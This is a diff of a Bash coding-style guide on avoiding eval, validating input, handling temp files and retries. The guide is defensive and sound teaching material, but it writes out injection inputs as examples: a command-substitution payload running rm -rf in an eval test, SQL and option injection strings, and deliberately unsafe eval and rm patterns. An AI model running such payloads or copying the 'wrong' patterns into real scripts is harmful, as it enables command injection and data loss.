-\`\`\`
+```
 
 **Safe Alternative 7: Use Arithmetic Expansion for Math**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval for arithmetic
 user_expr="$1"
 eval "result=$((user_expr))"  # Still risky!
@@ -19811,13 +19754,13 @@ fi
 
 # ✓ Better - use bc for complex math (isolates operations)
 result=$(bc <<< "$user_expr")
-\`\`\`
+```
 
 **Edge case: When eval seems necessary**
 
 **Scenario: Dynamic variable names in loops**
 
-\`\`\`bash
+```bash
 # Seems to need eval
 for service in nginx apache mysql; do
   eval "${service}_status=\$(systemctl is-active $service)"
@@ -19828,11 +19771,11 @@ declare -A service_status
 for service in nginx apache mysql; do
   service_status["$service"]=$(systemctl is-active "$service")
 done
-\`\`\`
+```
 
 **Scenario: Sourcing configuration with variable expansion**
 
-\`\`\`bash
+```bash
 # Config file contains: APP_DIR="$HOME/myapp"
 # Simple sourcing doesn't expand $HOME
 
@@ -19854,11 +19797,11 @@ if [[ -f config.txt && -r config.txt ]]; then
 else
   die 2 'Config file not found or not readable'
 fi
-\`\`\`
+```
 
 **Scenario: Building complex command with many options**
 
-\`\`\`bash
+```bash
 # Seems to need eval to build command string
 cmd="find /data -type f"
 [[ -n "$name_pattern" ]] && cmd="$cmd -name '$name_pattern'"
@@ -19870,11 +19813,11 @@ declare -a cmd=(find /data -type f)
 [[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
 [[ -n "$size" ]] && cmd+=(-size "$size")
 "${cmd[@]}"  # Safe execution
-\`\`\`
+```
 
 **The rare legitimate use of eval (with extreme caution):**
 
-\`\`\`bash
+```bash
 # Parsing output with known-safe format from trusted source
 # Example: getconf outputs shell variable assignments
 eval "$(getconf ARG_MAX)"  # Sets ARG_MAX variable
@@ -19884,11 +19827,11 @@ ARG_MAX=$(getconf ARG_MAX)
 
 # Another rare case: generating code from templates (development/build only)
 # NEVER in production with user input!
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval with any user input
 eval "$user_command"
 
@@ -19940,16 +19883,16 @@ eval "echo \$$var_name"
 
 # ✓ Correct - indirect expansion
 echo "${!var_name}"
-\`\`\`
+```
 
 **Complete safe example (no eval):**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -19991,7 +19934,7 @@ status_service() {
 
 # Build command dynamically with array (no eval)
 build_curl_command() {
-  local -- url="$1"
+  local -- url=$1
   local -a curl_cmd=(curl)
 
   # Add options based on configuration
@@ -20006,7 +19949,7 @@ build_curl_command() {
 }
 
 main() {
-  local -- action="${1:-status}"
+  local -- action=${1:-status}
 
   # Dispatch to function (no eval)
   if [[ -v "actions[$action]" ]]; then
@@ -20019,11 +19962,11 @@ main() {
 main "$@"
 
 #fin
-\`\`\`
+```
 
 **Detecting eval usage:**
 
-\`\`\`bash
+```bash
 # Find all eval usage in scripts
 grep -rn 'eval' /path/to/scripts/
 
@@ -20033,11 +19976,11 @@ grep -rn 'eval.*\$' /path/to/scripts/
 # ShellCheck will warn about eval
 shellcheck -x script.sh
 # SC2086: eval should not be used for variable expansion
-\`\`\`
+```
 
 **Testing for eval vulnerabilities:**
 
-\`\`\`bash
+```bash
 # Test script with malicious input
 test_eval_safety() {
   local -- malicious_input='$(rm -rf /tmp/test_eval_*)'
@@ -20061,7 +20004,7 @@ test_eval_safety() {
   # Cleanup
   rm -rf /tmp/test_eval_target
 }
-\`\`\`
+```
 
 **Summary:**
 
@@ -20096,10 +20039,10 @@ test_eval_safety() {
 
 **1. Filename validation:**
 
-\`\`\`bash
+```bash
 # Validate filename - no directory traversal, no special chars
 sanitize_filename() {
-  local -- name="$1"
+  local -- name=$1
 
   # Reject empty input
   [[ -n "$name" ]] || die 22 'Filename cannot be empty'
@@ -20109,15 +20052,13 @@ sanitize_filename() {
   name="${name//\//}"    # Remove all /
 
   # Allow only safe characters: alphanumeric, dot, underscore, hyphen
-  if [[ ! "$name" =~ ^[a-zA-Z0-9._-]+$ ]]; then
-    die 22 "Invalid filename '$name': contains unsafe characters"
-  fi
+  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || die 22 "Invalid filename ${name@Q}: contains unsafe characters"
 
   # Reject hidden files (starting with .)
-  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot: $name"
+  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot ${name@Q}"
 
   # Reject names that are too long
-  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars): $name"
+  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars) ${name@Q}"
 
   echo "$name"
 }
@@ -20125,14 +20066,14 @@ sanitize_filename() {
 # Usage
 user_filename=$(sanitize_filename "$user_input")
 safe_path="$SAFE_DIR/$user_filename"
-\`\`\`
+```
 
 **2. Numeric input validation:**
 
-\`\`\`bash
+```bash
 # Validate integer (positive or negative)
 validate_integer() {
-  local -- input="$1"
+  local -- input=$1
   [[ -n "$input" ]] || die 22 'Number cannot be empty'
 
   if [[ ! "$input" =~ ^-?[0-9]+$ ]]; then
@@ -20143,7 +20084,7 @@ validate_integer() {
 
 # Validate positive integer
 validate_positive_integer() {
-  local -- input="$1"
+  local -- input=$1
   [[ -n "$input" ]] || die 22 'Number cannot be empty'
 
   if [[ ! "$input" =~ ^[0-9]+$ ]]; then
@@ -20164,23 +20105,23 @@ validate_port() {
   ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
   echo "$port"
 }
-\`\`\`
+```
 
 **3. Path validation:**
 
-\`\`\`bash
+```bash
 # Validate path is within allowed directory
 validate_path() {
-  local -- input_path="$1"
-  local -- allowed_dir="$2"
+  local -- input_path=$1
+  local -- allowed_dir=$2
 
   # Resolve to absolute path
   local -- real_path
-  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path: $input_path"
+  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path ${input_path@Q}"
 
   # Ensure path is within allowed directory
   if [[ "$real_path" != "$allowed_dir"* ]]; then
-    die 5 "Path outside allowed directory: $real_path"
+    die 5 "Path outside allowed directory ${real_path@Q}"
   fi
 
   echo "$real_path"
@@ -20188,13 +20129,13 @@ validate_path() {
 
 # Usage
 safe_path=$(validate_path "$user_path" "/var/app/data")
-\`\`\`
+```
 
 **4. Email validation:**
 
-\`\`\`bash
+```bash
 validate_email() {
-  local -- email="$1"
+  local -- email=$1
   [[ -n "$email" ]] || die 22 'Email cannot be empty'
 
   # Basic email regex (not RFC-compliant but sufficient for most cases)
@@ -20209,18 +20150,18 @@ validate_email() {
 
   echo "$email"
 }
-\`\`\`
+```
 
 **5. URL validation:**
 
-\`\`\`bash
+```bash
 validate_url() {
-  local -- url="$1"
+  local -- url=$1
   [[ -n "$url" ]] || die 22 'URL cannot be empty'
 
   # Only allow http and https schemes
   if [[ ! "$url" =~ ^https?:// ]]; then
-    die 22 "URL must start with http:// or https://: $url"
+    die 22 "URL must start with http:// or https://: ${url@Q}"
   fi
 
   # Reject URLs with credentials (security risk)
@@ -20230,14 +20171,14 @@ validate_url() {
 
   echo "$url"
 }
-\`\`\`
+```
 
 **6. Whitelist validation:**
 
-\`\`\`bash
+```bash
 # Validate input against whitelist
 validate_choice() {
-  local -- input="$1"
+  local -- input=$1
   shift
   local -a valid_choices=("$@")
 
@@ -20246,37 +20187,37 @@ validate_choice() {
     [[ "$input" == "$choice" ]] && return 0
   done
 
-  die 22 "Invalid choice '$input'. Valid: ${valid_choices[*]}"
+  die 22 "Invalid choice ${input@Q}. Valid: ${valid_choices[*]}"
 }
 
 # Usage
 declare -a valid_actions=('start' 'stop' 'restart' 'status')
 validate_choice "$user_action" "${valid_actions[@]}"
-\`\`\`
+```
 
 **7. Username validation:**
 
-\`\`\`bash
+```bash
 validate_username() {
   local -- username="$1"
   [[ -n "$username" ]] || die 22 'Username cannot be empty'
 
   # Standard Unix username rules
   if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
-    die 22 "Invalid username: $username"
+    die 22 "Invalid username ${username@Q}"
   fi
 
   # Check length (typically max 32 chars on Unix)
   ((${#username} >= 1 && ${#username} <= 32)) || \
-    die 22 "Username must be 1-32 characters: $username"
+    die 22 "Username must be 1-32 characters ${username@Q}"
 
   echo "$username"
 }
-\`\`\`
+```
 
 **8. Command injection prevention:**
 
-\`\`\`bash
+```bash
 # NEVER pass user input directly to shell
 # ✗ DANGEROUS - command injection vulnerability
 user_file="$1"
@@ -20294,13 +20235,13 @@ case "$user_command" in
   start|stop|restart) systemctl "$user_command" myapp ;;
   *) die 22 "Invalid command: $user_command" ;;
 esac
-\`\`\`
+```
 
 **9. Option injection prevention:**
 
-\`\`\`bash
+```bash
 # User input could be malicious option like "--delete-all"
-user_file="$1"
+user_file=$1
 
 # ✗ Dangerous - if user_file="--delete-all", disaster!
 rm "$user_file"
@@ -20314,13 +20255,13 @@ ls "$user_file"  # If user_file="-la", becomes: ls -la
 # ✓ Safe - use -- or prepend ./
 ls -- "$user_file"
 ls ./"$user_file"
-\`\`\`
+```
 
 **10. SQL injection prevention (if generating SQL):**
 
-\`\`\`bash
+```bash
 # ✗ DANGEROUS - SQL injection vulnerability
-user_id="$1"
+user_id=$1
 query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"
 
 # ✓ Safe - validate input type first
@@ -20329,28 +20270,28 @@ query="SELECT * FROM users WHERE id=$user_id"
 
 # ✓ Better - use parameterized queries (with proper DB tools)
 # This is just bash demo - use proper DB library in production
-\`\`\`
+```
 
 **Complete validation example:**
 
-\`\`\`bash
+```bash
 #!/usr/bin/env bash
 set -euo pipefail
 
 # Validation functions
 validate_positive_integer() {
-  local input="$1"
+  local input=$1
   [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || \
     die 22 "Invalid positive integer: $input"
   echo "$input"
 }
 
 sanitize_filename() {
-  local name="$1"
+  local name=$1
   name="${name//\.\./}"
   name="${name//\//}"
   [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || \
-    die 22 "Invalid filename: $name"
+    die 22 "Invalid filename ${name@Q}"
   echo "$name"
 }
 
@@ -20360,8 +20301,8 @@ while (($#)); do case $1 in
                   count=$(validate_positive_integer "$1") ;;
   -f|--file)      noarg "$@"; shift
                   filename=$(sanitize_filename "$1") ;;
-  -*)             die 22 "Invalid option: $1" ;;
-  *)              die 2 "Unexpected argument: $1" ;;
+  -*)             die 22 "Invalid option ${1@Q}" ;;
+  *)              die 2 "Unexpected argument ${1@Q}" ;;
 esac; shift; done
 
 # Validate required arguments provided
@@ -20372,11 +20313,11 @@ esac; shift; done
 for ((i=0; i<count; i+=1)); do
   echo "Processing iteration $i" >> "$filename"
 done
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ WRONG - trusting user input
 rm -rf "$user_dir"  # user_dir="/" = disaster!
 
@@ -20396,7 +20337,7 @@ process "$filename"
 
 # ✓ Correct - whitelist approach
 [[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
-\`\`\`
+```
 
 **Security principles:**
 
@@ -20442,7 +20383,7 @@ process "$filename"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -20460,7 +20401,7 @@ create_temp_file() {
   # Make variable readonly
   readonly -- temp_file
 
-  info "Created temp file: $temp_file"
+  info "Created temp file ${temp_file@Q}"
 
   # Use temp file
   echo 'Test data' > "$temp_file"
@@ -20474,7 +20415,6 @@ main() {
 }
 
 main "$@"
-
 #fin
 ```
 
@@ -20485,7 +20425,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -20503,11 +20443,11 @@ create_temp_dir() {
   # Make variable readonly
   readonly -- temp_dir
 
-  info "Created temp directory: $temp_dir"
+  info "Created temp directory ${temp_dir@Q}"
 
   # Use temp directory
-  echo 'file1' > "$temp_dir/file1.txt"
-  echo 'file2' > "$temp_dir/file2.txt"
+  echo 'file1' > "$temp_dir"/file1.txt
+  echo 'file2' > "$temp_dir"/file2.txt
 
   ls -la "$temp_dir"
 
@@ -20530,7 +20470,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -20546,7 +20486,7 @@ create_custom_temp() {
   trap 'rm -f "$temp_file"' EXIT
   readonly -- temp_file
 
-  info "Created temp file: $temp_file"
+  info "Created temp file ${temp_file@Q}"
   # Output example: /tmp/myscript.Ab3X9z
 
   # Use temp file
@@ -20564,7 +20504,7 @@ create_custom_temp_dir() {
   trap 'rm -rf "$temp_dir"' EXIT
   readonly -- temp_dir
 
-  info "Created temp directory: $temp_dir"
+  info "Created temp directory ${temp_dir@Q}"
   # Output example: /tmp/myscript-work.Xy7Pm2
 }
 
@@ -20574,13 +20514,13 @@ create_temp_with_extension() {
 
   # mktemp doesn't support extensions directly, so add it
   temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
-  mv "$temp_file" "$temp_file.json"
-  temp_file="$temp_file.json"
+  mv "$temp_file" "$temp_file".json
+  temp_file="$temp_file".json
 
   trap 'rm -f "$temp_file"' EXIT
   readonly -- temp_file
 
-  info "Created temp file: $temp_file"
+  info "Created temp file: ${temp_file@Q}"
 
   # Use temp file
   echo '{"key": "value"}' > "$temp_file"
@@ -20604,7 +20544,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -20665,9 +20605,9 @@ main() {
 
   readonly -- temp1 temp2 temp_dir
 
-  info "Temp file 1: $temp1"
-  info "Temp file 2: $temp2"
-  info "Temp directory: $temp_dir"
+  info "Temp file 1: ${temp1@Q}"
+  info "Temp file 2: ${temp2@Q}"
+  info "Temp directory: ${temp_dir@Q}"
 
   # Use temp files
   echo 'Data 1' > "$temp1"
@@ -20689,7 +20629,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -20700,12 +20640,12 @@ create_temp_robust() {
 
   # Create temp file
   if ! temp_file=$(mktemp 2>&1); then
-    die 1 "Failed to create temporary file: $temp_file"
+    die 1 "Failed to create temporary file ${temp_file@Q}"
   fi
 
   # Validate temp file was created
   if [[ ! -f "$temp_file" ]]; then
-    die 1 "Temp file does not exist: $temp_file"
+    die 1 "Temp file does not exist ${temp_file@Q}"
   fi
 
   # Check permissions (should be 0600)
@@ -20720,7 +20660,7 @@ create_temp_robust() {
   trap 'rm -f "$temp_file"' EXIT
   readonly -- temp_file
 
-  info "Created secure temp file: $temp_file (permissions: $perms)"
+  info "Created secure temp file ${temp_file@Q} (permissions $perms)"
 
   echo "$temp_file"
 }
@@ -20745,7 +20685,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -20783,13 +20723,7 @@ warn() { >&2 _msg "$@"; }
 error() { >&2 _msg "$@"; }
 success() { >&2 _msg "$@"; }
 debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }
-
-die() {
-  local -i exit_code=${1:-1}
-  shift
-  (($#)) && error "$@"
-  exit "$exit_code"
-}
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # ============================================================================
 # Cleanup Functions
@@ -20800,7 +20734,7 @@ cleanup() {
   local -- resource
 
   if ((KEEP_TEMP)); then
-    if [[ ${#TEMP_RESOURCES[@]} -gt 0 ]]; then
+    if ((${#TEMP_RESOURCES[@]})); then
       info 'Keeping temporary files (--keep-temp specified):'
       for resource in "${TEMP_RESOURCES[@]}"; do
         info "  $resource"
@@ -20809,15 +20743,15 @@ cleanup() {
     return "$exit_code"
   fi
 
-  if [[ ${#TEMP_RESOURCES[@]} -gt 0 ]]; then
+  if ((${#TEMP_RESOURCES[@]})); then
     debug "Cleaning up ${#TEMP_RESOURCES[@]} temporary resources"
 
     for resource in "${TEMP_RESOURCES[@]}"; do
       if [[ -f "$resource" ]]; then
-        debug "Removing temp file: $resource"
+        debug "Removing temp file ${resource@Q}"
         rm -f "$resource"
       elif [[ -d "$resource" ]]; then
-        debug "Removing temp directory: $resource"
+        debug "Removing temp directory ${resource@Q}"
         rm -rf "$resource"
       fi
     done
@@ -20835,12 +20769,12 @@ trap cleanup EXIT
 
 # Create temp file and register for cleanup
 make_temp_file() {
-  local -- template="${1:-}"
+  local -- template=${1:-}
   local -- temp_file
 
   if [[ -n "$template" ]]; then
-    temp_file=$(mktemp "/tmp/$template.XXXXXX") ||
-      die 1 "Failed to create temp file with template: $template"
+    temp_file=$(mktemp /tmp/"$template".XXXXXX) ||
+      die 1 "Failed to create temp file with template ${template@Q}"
   else
     temp_file=$(mktemp) ||
       die 1 'Failed to create temp file'
@@ -20849,18 +20783,18 @@ make_temp_file() {
   # Register for cleanup
   TEMP_RESOURCES+=("$temp_file")
 
-  debug "Created temp file: $temp_file"
+  debug "Created temp file ${temp_file@Q}"
   echo "$temp_file"
 }
 
 # Create temp directory and register for cleanup
 make_temp_dir() {
-  local -- template="${1:-}"
+  local -- template=${1:-}
   local -- temp_dir
 
   if [[ -n "$template" ]]; then
-    temp_dir=$(mktemp -d "/tmp/$template.XXXXXX") ||
-      die 1 "Failed to create temp directory with template: $template"
+    temp_dir=$(mktemp -d /tmp/"$template".XXXXXX) ||
+      die 1 "Failed to create temp directory with template ${template@Q}"
   else
     temp_dir=$(mktemp -d) ||
       die 1 'Failed to create temp directory'
@@ -20869,7 +20803,7 @@ make_temp_dir() {
   # Register for cleanup
   TEMP_RESOURCES+=("$temp_dir")
 
-  debug "Created temp directory: $temp_dir"
+  debug "Created temp directory ${temp_dir@Q}"
   echo "$temp_dir"
 }
 
@@ -20879,7 +20813,7 @@ make_temp_dir() {
 
 noarg() {
   if (($# < 2)) || [[ "$2" =~ ^- ]]; then
-    die 22 "Option $1 requires an argument"
+    die 22 "Option ${1@Q} requires an argument"
   fi
 }
 
@@ -20889,17 +20823,17 @@ noarg() {
 
 # Process file with multiple temp files
 process_file() {
-  local -- input_file="$1"
-  local -- output_file="$2"
+  local -- input_file=$1
+  local -- output_file=$2
 
   # Validate input
   if [[ ! -f "$input_file" ]]; then
-    error "Input file not found: $input_file"
+    error "Input file not found ${input_file@Q}"
     return 2
   fi
 
   if [[ ! -r "$input_file" ]]; then
-    error "Input file not readable: $input_file"
+    error "Input file not readable ${input_file@Q}"
     return 1
   fi
 
@@ -20953,12 +20887,12 @@ batch_process() {
 
   # Create temp directory for outputs
   local -- temp_output_dir
-  temp_output_dir=$(make_temp_dir "$SCRIPT_NAME-output")
+  temp_output_dir=$(make_temp_dir "$SCRIPT_NAME"-output)
 
   info "Processing ${#input_files[@]} files"
 
   for input_file in "${input_files[@]}"; do
-    output_file="$temp_output_dir/${input_file##*/}.processed"
+    output_file="$temp_output_dir"/"${input_file##*/}".processed
 
     if process_file "$input_file" "$output_file"; then
       ((success_count+=1))
@@ -21045,7 +20979,7 @@ main() {
         ;;
 
       -*)
-        die 22 "Invalid option: $1"
+        die 22 "Invalid option ${1@Q}"
         ;;
 
       *)
@@ -21063,7 +20997,7 @@ main() {
   readonly -a input_files
 
   # Validate
-  if [[ ${#input_files[@]} -eq 0 ]]; then
+  if ((${#input_files[@]} == 0)); then
     error 'No input files specified'
     usage
     return 22
@@ -21097,7 +21031,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -21111,7 +21045,7 @@ secure_temp_file() {
 
   # Verify it's a regular file
   if [[ ! -f "$temp_file" ]]; then
-    die 1 "Temp file is not a regular file: $temp_file"
+    die 1 "Temp file is not a regular file ${temp_file@Q}"
   fi
 
   # Verify ownership (should be current user)
@@ -21134,7 +21068,7 @@ secure_temp_file() {
   trap 'rm -f "$temp_file"' EXIT
   readonly -- temp_file
 
-  info "Created secure temp file: $temp_file"
+  info "Created secure temp file: ${temp_file@Q}"
   info "  Owner: $owner"
   info "  Permissions: $perms"
 
@@ -21150,7 +21084,7 @@ secure_temp_dir() {
 
   # Verify it's a directory
   if [[ ! -d "$temp_dir" ]]; then
-    die 1 "Temp path is not a directory: $temp_dir"
+    die 1 "Temp path is not a directory ${temp_dir@Q}"
   fi
 
   # Verify permissions (0700)
@@ -21165,7 +21099,7 @@ secure_temp_dir() {
   trap 'rm -rf "$temp_dir"' EXIT
   readonly -- temp_dir
 
-  info "Created secure temp directory: $temp_dir (permissions: $perms)"
+  info "Created secure temp directory ${temp_dir@Q} permissions $perms)"
 
   echo "$temp_dir"
 }
@@ -21190,7 +21124,7 @@ main "$@"
 
 ```bash
 # ✗ WRONG - Hard-coded temp file path
-temp_file="/tmp/myapp_temp.txt"
+temp_file=/tmp/myapp_temp.txt
 echo 'data' > "$temp_file"
 # Problems:
 # - Not unique (collisions with other instances)
@@ -21203,7 +21137,7 @@ trap 'rm -f "$temp_file"' EXIT
 echo 'data' > "$temp_file"
 
 # ✗ WRONG - Using PID in filename
-temp_file="/tmp/myapp_$$.txt"
+temp_file=/tmp/myapp_"$$".txt
 echo 'data' > "$temp_file"
 # Problems:
 # - Still predictable
@@ -21296,7 +21230,7 @@ temp2=$(mktemp)
 TEMP_FILES+=("$temp2")
 
 # ✗ WRONG - Using /tmp directly in script directory
-temp_file="$SCRIPT_DIR/temp.txt"
+temp_file="$SCRIPT_DIR"/temp.txt
 # Problem: pollutes script directory
 
 # ✓ CORRECT - Use system temp directory
@@ -21321,7 +21255,7 @@ trap 'rm -rf "$temp_dir"' EXIT
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -21349,7 +21283,7 @@ main() {
   TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
   readonly -- TEMP_FILE
 
-  info "Using temp file: $TEMP_FILE"
+  info "Using temp file ${TEMP_FILE@Q}"
 
   # Do work...
 
@@ -21369,7 +21303,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -21382,7 +21316,7 @@ cleanup() {
   local -- file
 
   if ((KEEP_TEMP)); then
-    if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
+    if ((${#TEMP_FILES[@]})); then
       info 'Keeping temp files for debugging:'
       for file in "${TEMP_FILES[@]}"; do
         info "  $file"
@@ -21390,8 +21324,8 @@ cleanup() {
     fi
   else
     for file in "${TEMP_FILES[@]}"; do
-      [[ -f "$file" ]] && rm -f "$file"
-      [[ -d "$file" ]] && rm -rf "$file"
+      [[ -f "$file" ]] && rm -f "$file" ||:
+      [[ -d "$file" ]] && rm -rf "$file" ||:
     done
   fi
 
@@ -21430,13 +21364,13 @@ main "$@"
 
 ```bash
 # Create temp file in specific directory
-temp_file=$(mktemp "$SCRIPT_DIR/temp.XXXXXX") ||
+temp_file=$(mktemp "$SCRIPT_DIR"/temp.XXXXXX) ||
   die 1 'Failed to create temp file in script directory'
 
 trap 'rm -f "$temp_file"' EXIT
 
 # Create temp directory in specific location
-temp_dir=$(mktemp -d "$HOME/work/temp.XXXXXX") ||
+temp_dir=$(mktemp -d "$HOME"/work/temp.XXXXXX) ||
   die 1 'Failed to create temp directory'
 
 trap 'rm -rf "$temp_dir"' EXIT
@@ -21449,7 +21383,7 @@ trap 'rm -rf "$temp_dir"' EXIT
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -21503,7 +21437,7 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -21527,7 +21461,7 @@ main() {
   TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
   readonly -- TEMP_FILE
 
-  info "Press Ctrl-C to test signal handling"
+  info 'Press Ctrl-C to test signal handling'
 
   # Simulate long-running operation
   local -i i
@@ -21629,8 +21563,8 @@ if kill -0 "$pid" 2>/dev/null; then
 fi
 
 # Get process state from /proc
-if [[ -d /proc/$pid ]]; then
-  state=$(< /proc/$pid/stat)
+if [[ -d /proc/"$pid" ]]; then
+  state=$(< /proc/"$pid"/stat)
 fi
 ```
 
@@ -21708,8 +21642,6 @@ echo "Started $!"
 
 **Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 475-510
 
-#fin
-
 
 ---
 
@@ -21775,7 +21707,7 @@ done
 
 # Output results in original order
 for server in "${servers[@]}"; do
-  [[ -f "$temp_dir/$server.out" ]] && cat "$temp_dir/$server.out"
+  [[ -f "$temp_dir"/"$server".out ]] && cat "$temp_dir"/"$server".out
 done
 ```
 
@@ -21813,17 +21745,17 @@ wait
 # ✗ Wrong - variable lost in subshell
 count=0
 for task in "${tasks[@]}"; do
-  { process "$task"; ((count+=1)); } &
+  { process "$task"; count+=1; } &
 done
 wait
 echo "$count"  # Always 0!
 
 # ✓ Correct - use temp files for results
 for task in "${tasks[@]}"; do
-  { process "$task" && echo 1 >> "$temp_dir/count"; } &
+  { process "$task" && echo 1 >> "$temp_dir"/count; } &
 done
 wait
-count=$(wc -l < "$temp_dir/count")
+count=$(wc -l < "$temp_dir"/count)
 ```
 
 ---
@@ -21831,8 +21763,6 @@ count=$(wc -l < "$temp_dir/count")
 **See Also:** BCS1406 (Background Jobs), BCS1408 (Wait Patterns)
 
 **Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 465-530
-
-#fin
 
 
 ---
@@ -21948,8 +21878,6 @@ wait $! || die 1 'Command failed'
 ---
 
 **See Also:** BCS1406 (Background Jobs), BCS1407 (Parallel Execution)
-
-#fin
 
 
 ---
@@ -22067,8 +21995,6 @@ timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
 
 **Full implementation:** See `examples/exemplar-code/oknav/oknav` line 676
 
-#fin
-
 
 ---
 
@@ -22077,7 +22003,7 @@ timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
 
 ## Exponential Backoff
 
-**Rule: BCS1410** (New)
+**Rule: BCS1410**
 
 Implementing retry logic with exponential delay for transient failures.
 
@@ -22109,7 +22035,7 @@ retry_with_backoff() {
     local -i delay=$((2 ** attempt))
     warn "Attempt $attempt failed, retrying in ${delay}s..."
     sleep "$delay"
-    ((attempt+=1))
+    attempt+=1
   done
 
   error "Failed after $max_attempts attempts"
@@ -22133,11 +22059,11 @@ retry_with_backoff() {
     fi
 
     local -i delay=$((2 ** attempt))
-    ((delay > max_delay)) && delay=$max_delay
+    ((delay > max_delay)) && delay=$max_delay ||:
 
-    ((VERBOSE)) && info "Retry $attempt in ${delay}s..."
+    ((VERBOSE)) && info "Retry $attempt in ${delay}s..." ||:
     sleep "$delay"
